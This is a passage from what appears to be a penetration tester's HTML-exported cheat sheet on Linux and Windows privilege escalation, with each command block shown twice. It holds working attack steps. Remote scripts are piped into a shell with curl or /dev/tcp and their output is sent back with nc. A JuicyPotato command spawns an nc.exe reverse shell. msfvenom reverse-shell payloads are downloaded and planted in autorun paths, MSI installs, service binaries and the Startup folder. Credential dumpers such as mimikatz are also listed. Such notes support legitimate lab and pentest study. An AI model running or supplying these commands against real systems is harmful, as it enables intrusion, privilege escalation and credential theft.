curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 &lt; linpeas.sh #Host
cat &lt; /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

# Output to file
./linpeas.sh -a &gt; /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64</pre><pre class="hljs"><code><span class="hljs-comment"># From github</span>
curl -L https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng<span class="hljs-regexp">/releases/</span>latest<span class="hljs-regexp">/download/</span>linpeas.sh | sh

<span class="hljs-comment"># Local network</span>
sudo python -m SimpleHTTPServer <span class="hljs-number">80</span> <span class="hljs-comment">#Host</span>
curl <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>/linpeas.sh | sh <span class="hljs-comment">#Victim</span>

<span class="hljs-comment"># Without curl</span>
sudo nc -q <span class="hljs-number">5</span> -lvnp <span class="hljs-number">80</span> &lt; linpeas.sh <span class="hljs-comment">#Host</span>
cat &lt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.10.10/</span><span class="hljs-number">80</span> | sh <span class="hljs-comment">#Victim</span>

<span class="hljs-comment"># Excute from memory and send output back to the host</span>
nc -lvnp <span class="hljs-number">9002</span> | tee linpeas.out <span class="hljs-comment">#Host</span>
curl <span class="hljs-number">10.10</span>.<span class="hljs-number">14.20</span>:<span class="hljs-number">8000</span>/linpeas.sh | sh | nc <span class="hljs-number">10.10</span>.<span class="hljs-number">14.20</span> <span class="hljs-number">9002</span> <span class="hljs-comment">#Victim</span>

<span class="hljs-comment"># Output to file</span>
.<span class="hljs-regexp">/linpeas.sh -a &gt; /</span>dev<span class="hljs-regexp">/shm/</span>linpeas.txt <span class="hljs-comment">#Victim</span>
less -r <span class="hljs-regexp">/dev/</span>shm/linpeas.txt <span class="hljs-comment">#Read with colors</span>

<span class="hljs-comment"># Use a linpeas binary</span>
wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng<span class="hljs-regexp">/releases/</span>latest<span class="hljs-regexp">/download/</span>linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64</code></pre></div>
<hr>
<h4 id="vulnerability-scan">Vulnerability scan</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">perl les2.pl
bash les.sh</pre><pre class="hljs"><code>perl les2.<span class="hljs-keyword">pl</span>
bash les.<span class="hljs-keyword">sh</span></code></pre></div>
<h4 id="suid-checker">Suid checker</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python suid3num.py

https://gtfobins.github.io/</pre><pre class="hljs"><code>python suid3num.py

https:<span class="hljs-regexp">//g</span>tfobins.github.io/</code></pre></div>
<h4 id="methodology-to-follow">Methodology to follow</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gui</span>f.re/linuxeop
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Methodology%20and%20Resources/</span>Linux%<span class="hljs-number">20</span>-%<span class="hljs-number">20</span>Privilege%<span class="hljs-number">20</span>Escalation.md</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)</pre><pre class="hljs"><code>sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, <span class="hljs-number">000</span>- <span class="hljs-keyword">default</span>.conf...)
Known binaries <span class="hljs-keyword">with</span> suid flag <span class="hljs-built_in">and</span> interactive (nmap)
<span class="hljs-keyword">Custom</span> binaries <span class="hljs-keyword">with</span> suid flag either <span class="hljs-keyword">using</span> other binaries <span class="hljs-built_in">or</span> <span class="hljs-keyword">with</span> command execution
Writable files owned <span class="hljs-keyword">by</span> root that <span class="hljs-keyword">get</span> executed (cronjobs)
MySQL <span class="hljs-keyword">as</span> root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH <span class="hljs-keyword">private</span> <span class="hljs-keyword">key</span>
Listening ports <span class="hljs-keyword">on</span> localhost
/etc/fstab
/etc/exports
/var/mail
Process <span class="hljs-keyword">as</span> other user (root) executing something you have permissions <span class="hljs-keyword">to</span> modify
SSH <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span> + Predictable PRNG
apt update hooking (PreInvoke)</code></pre></div>
<h3 id="windows-5">Windows</h3>
<h4 id="enumeration-scripts-2">Enumeration scripts</h4>
<h5 id="general-scans">General scans</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe
windows-privesc-check2.exe
Seatbelt.exe -group=all
powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;
Powerless.bat
winPEAS.bat</pre><pre class="hljs"><code>winPEAS.<span class="hljs-keyword">exe</span>
windows-privesc-check2.<span class="hljs-keyword">exe</span>
Seatbelt.<span class="hljs-keyword">exe</span> -group=<span class="hljs-keyword">all</span>
powershell -exec bypass -<span class="hljs-keyword">command</span> <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>
Powerless.bat
winPEAS.bat</code></pre></div>
<h5 id="search-for-cve">Search for CVE</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">systeminfo &gt; systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database &lt;DATE&gt;-mssb.xlsx --systeminfo systeminfo.txt

systeminfo &gt; systeminfo.txt
wmic qfe &gt; qfe.txt
python wes.py -u
python wes.py systeminfo.txt qfe.txt

powershell -exec bypass -command &quot;&amp; { Import-Module .\Sherlock.ps1; Find-AllVulns; }&quot;</pre><pre class="hljs"><code>systeminfo &gt; systeminfo<span class="hljs-selector-class">.txt</span>
python windows-exploit-suggester<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--update</span>
python windows-exploit-suggester<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--database</span> &lt;DATE&gt;-mssb<span class="hljs-selector-class">.xlsx</span> <span class="hljs-attr">--systeminfo</span> systeminfo<span class="hljs-selector-class">.txt</span>

systeminfo &gt; systeminfo<span class="hljs-selector-class">.txt</span>
wmic qfe &gt; qfe<span class="hljs-selector-class">.txt</span>
python wes<span class="hljs-selector-class">.py</span> -u
python wes<span class="hljs-selector-class">.py</span> systeminfo<span class="hljs-selector-class">.txt</span> qfe<span class="hljs-selector-class">.txt</span>

powershell -exec bypass -command <span class="hljs-string">&quot;&amp; { Import-Module .\Sherlock.ps1; Find-AllVulns; }&quot;</span></code></pre></div>
<h5 id="post-exploitation">Post exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">lazagne.exe all
SharpWeb.exe
mimikatz.exe</pre><pre class="hljs"><code>lazagne.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">all</span>
SharpWeb.<span class="hljs-keyword">exe</span>
mimikatz.<span class="hljs-keyword">exe</span></code></pre></div>
<h4 id="juicypotato-seimpersonate-or-seassignprimarytoken">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe&quot; -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe&quot; -t * -c &lt;CLSID&gt;

# CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</pre><pre class="hljs"><code>If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l <span class="hljs-number">1337</span> -p c:\windows\system32\cmd.exe -a <span class="hljs-string">&quot;/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe&quot;</span> -t *
JuicyPotato.exe -l <span class="hljs-number">1337</span> -p c:\windows\system32\cmd.exe -a <span class="hljs-string">&quot;/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe&quot;</span> -t * -c &lt;CLSID&gt;

<span class="hljs-comment"># CLSID</span>
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ohpe/</span>juicy-potato<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/CLSID/</span>README.md</code></pre></div>
<h4 id="methodology-to-follow-2">Methodology to follow</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://guif.re/windowseop
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gui</span>f.re/windowseop
https:<span class="hljs-regexp">//</span>pentest.blog<span class="hljs-regexp">/windows-privilege-escalation-methods-for-pentesters/</span>
https:<span class="hljs-regexp">//my</span>securityjournal.blogspot.com<span class="hljs-regexp">/p/</span>client-side-attacks.html
http:<span class="hljs-regexp">//</span>www.fuzzysecurity.com<span class="hljs-regexp">/tutorials/</span><span class="hljs-number">16</span>.html
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Methodology%20and%20Resources/</span>Windows%<span class="hljs-number">20</span>-%<span class="hljs-number">20</span>Privilege%<span class="hljs-number">20</span>Escalation.md</code></pre></div>
<h4 id="autorun">Autorun</h4>
<h5 id="detection">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;

[*] Checking for modifiable registry autoruns and configs...

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : &quot;C:\Program Files\Autorun Program\program.exe&quot;
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}</pre><pre class="hljs"><code>powershell -exec bypass -command <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>

[*] Checking <span class="hljs-keyword">for</span> modifiable registry autoruns <span class="hljs-keyword">and</span> configs<span class="hljs-built_in">..</span>.

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : <span class="hljs-string">&quot;C:\Program Files\Autorun Program\program.exe&quot;</span>
ModifiableFile : @{<span class="hljs-attribute">Permissions</span>=System.Object[]; <span class="hljs-attribute">ModifiablePath</span>=C:\Program Files\Autorun Program\program.exe; <span class="hljs-attribute">IdentityReference</span>=Everyone}</code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]</pre><pre class="hljs"><code>winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\<span class="hljs-keyword">Program</span> Files\Autorun <span class="hljs-keyword">Program</span>
    <span class="hljs-keyword">File</span>: C:\<span class="hljs-keyword">Program</span> Files\Autorun <span class="hljs-keyword">Program</span>\<span class="hljs-keyword">program</span>.exe
    FilePerms: Everyone [AllAccess]</code></pre></div>
<h5 id="exploitation">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.</pre><pre class="hljs"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc -lvp &lt;PORT&gt;

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/program.exe&#x27;</span>, <span class="hljs-string">&#x27;.\program.exe&#x27;</span>)

<span class="hljs-keyword">To</span> <span class="hljs-keyword">execute</span> it <span class="hljs-keyword">with</span> elevated <span class="hljs-keyword">privileges</span> we need <span class="hljs-keyword">to</span> wait <span class="hljs-keyword">for</span> someone <span class="hljs-keyword">in</span> the <span class="hljs-keyword">Admin</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">login</span>.</code></pre></div>
<h4 id="alwaysinstallelevated">AlwaysInstallElevated</h4>
<h5 id="detection-2">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI</pre><pre class="hljs"><code>powershell -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>

[*] Checking <span class="hljs-keyword">for</span> AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI</code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to 1 then it's vulnerable.</pre><pre class="hljs"><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> it<span class="hljs-string">&#x27;s vulnerable.</span></code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!</pre><pre class="hljs"><code>winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated <span class="hljs-built_in">set</span> <span class="hljs-keyword">to</span> 1 <span class="hljs-keyword">in</span> HKLM!
  AlwaysInstallElevated <span class="hljs-built_in">set</span> <span class="hljs-keyword">to</span> 1 <span class="hljs-keyword">in</span> HKCU!</code></pre></div>
<h5 id="exploitation-2">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi &gt; program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.msi', 'C:\Temp\program.msi')
msiexec /quiet /qn /i C:\Temp\program.msi</pre><pre class="hljs"><code><span class="hljs-comment"># Attacker</span>
msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;IP&gt; <span class="hljs-attribute">LPORT</span>=&lt;PORT&gt; -f msi &gt; program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

<span class="hljs-comment"># Victim</span>
powershell.exe (New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/program.msi&#x27;</span>, <span class="hljs-string">&#x27;C:\Temp\program.msi&#x27;</span>)
msiexec /quiet /qn /i C:\Temp\program.msi</code></pre></div>
<h4 id="executable-files">Executable Files</h4>
<h5 id="detection-3">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc
Path                            : &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True</pre><pre class="hljs"><code><span class="hljs-string">powershell</span> <span class="hljs-string">-exec</span> <span class="hljs-string">bypass</span> <span class="hljs-string">-command</span> <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>

[<span class="hljs-string">*</span>] <span class="hljs-string">Checking</span> <span class="hljs-string">service</span> <span class="hljs-string">executable</span> <span class="hljs-string">and</span> <span class="hljs-string">argument</span> <span class="hljs-string">permissions...</span>

<span class="hljs-attr">ServiceName                     :</span> <span class="hljs-string">filepermsvc</span>
<span class="hljs-attr">Path                            :</span> <span class="hljs-string">&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span>
<span class="hljs-attr">ModifiableFile                  :</span> <span class="hljs-string">C:\Program</span> <span class="hljs-string">Files\File</span> <span class="hljs-string">Permissions</span> <span class="hljs-string">Service\filepermservice.exe</span>
<span class="hljs-attr">ModifiableFilePermissions       :</span> {<span class="hljs-string">ReadAttributes</span>, <span class="hljs-string">ReadControl</span>, <span class="hljs-string">Execute/Traverse</span>, <span class="hljs-string">DeleteChild...</span>}
<span class="hljs-attr">ModifiableFileIdentityReference :</span> <span class="hljs-string">Everyone</span>
<span class="hljs-attr">StartName                       :</span> <span class="hljs-string">LocalSystem</span>
<span class="hljs-attr">AbuseFunction                   :</span> <span class="hljs-string">Install-ServiceBinary</span> <span class="hljs-string">-Name</span> <span class="hljs-string">&#x27;filepermsvc&#x27;</span>
<span class="hljs-attr">CanRestart                      :</span> <span class="hljs-literal">True</span></code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

filepermsvc(Apache Software Foundation - File Permissions Service)[&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;] - Manual - Stopped
    File Permissions: Everyone [AllAccess]</pre><pre class="hljs"><code>winPEAS<span class="hljs-selector-class">.exe</span>

<span class="hljs-selector-attr">[+]</span> Interesting Services -non Microsoft-(T1007)

<span class="hljs-function"><span class="hljs-title">filepermsvc</span><span class="hljs-params">(Apache Software Foundation - File Permissions Service)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span>]</span> - Manual - Stopped
    File Permissions: Everyone <span class="hljs-selector-attr">[AllAccess]</span></code></pre></div>
<h5 id="exploitation-3">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', 'C:\Temp\program.exe')
copy /y c:\Temp\program.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;
sc start filepermsvc</pre><pre class="hljs"><code># Attacker
msfvenom -<span class="hljs-keyword">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-symbol">&lt;IP&gt;</span> LPORT=<span class="hljs-symbol">&lt;PORT&gt;</span> -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span> &gt; program.<span class="hljs-keyword">exe</span>
sudo <span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc -lvp <span class="hljs-symbol">&lt;PORT&gt;</span>

# Victim
powershell.<span class="hljs-keyword">exe</span> (New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/program.exe&#x27;</span>, <span class="hljs-string">&#x27;C:\Temp\program.exe&#x27;</span>)
<span class="hljs-keyword">copy</span> /<span class="hljs-keyword">y</span> <span class="hljs-keyword">c</span>:\Temp\program.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span>
sc start filepermsvc</code></pre></div>
<h4 id="startup-applications">Startup applications</h4>
<h5 id="detection-4">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;

C:\&gt;icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.</pre><pre class="hljs"><code>icacls.exe <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span>

C:\&gt;icacls.exe <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span>
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user yo<span class="hljs-string">u&#x27;re connecte with has full access ‘(F)’ to the directory (here Users) then it&#x27;</span>s vulnerable.</code></pre></div>
<h5 id="exploitation-4">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.</pre><pre class="hljs"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc -lvp &lt;PORT&gt;

# Victim
cd &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;
powershell.exe (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/program.exe&#x27;</span>, <span class="hljs-string">&#x27;.\program.exe&#x27;</span>)

<span class="hljs-keyword">To</span> <span class="hljs-keyword">execute</span> it <span class="hljs-keyword">with</span> elevated <span class="hljs-keyword">privileges</span> we need <span class="hljs-keyword">to</span> wait <span class="hljs-keyword">for</span> someone <span class="hljs-keyword">in</span> the <span class="hljs-keyword">Admin</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">login</span>.</code></pre></div>
<h4 id="weak-service-permission">Weak service permission</h4>
<h5 id="detection-5">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Find all services authenticated users have modify access onto
accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *

if SERVICE_ALL_ACCESS then vulnerable

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs &quot;Authenticated Users&quot; c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs &quot;Authenticated Users&quot; c:\*.*</pre><pre class="hljs"><code><span class="hljs-comment"># Find all services authenticated users have modify access onto</span>
accesschk.exe <span class="hljs-string">/accepteula</span> -uwcqv <span class="hljs-string">&quot;Authenticated Users&quot;</span> *

<span class="hljs-keyword">if</span> SERVICE_ALL_ACCESS then vulnerable

<span class="hljs-comment"># Find all weak folder permissions per drive.</span>
accesschk.exe <span class="hljs-string">/accepteula</span> -uwdqs Users c:\
accesschk.exe <span class="hljs-string">/accepteula</span> -uwdqs <span class="hljs-string">&quot;Authenticated Users&quot;</span> c:\

<span class="hljs-comment"># Find all weak file permissions per drive.</span>
accesschk.exe <span class="hljs-string">/accepteula</span> -uwqs Users c:\*.*
accesschk.exe <span class="hljs-string">/accepteula</span> -uwqs <span class="hljs-string">&quot;Authenticated Users&quot;</span> c:\*.*</code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : &quot;C:\Program Files\DACL Service\daclservice.exe&quot;
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True</pre><pre class="hljs"><code>powershell -<span class="hljs-built_in">exec</span> bypass -command <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : <span class="hljs-string">&quot;C:\Program Files\DACL Service\daclservice.exe&quot;</span>
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -<span class="hljs-built_in">Name</span> <span class="hljs-string">&#x27;daclsvc&#x27;</span>
CanRestart    : <span class="hljs-literal">True</span></code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

daclsvc(DACL Service)[&quot;C:\Program Files\DACL Service\daclservice.exe&quot;] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

[+] Modifiable Services(T1007)
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
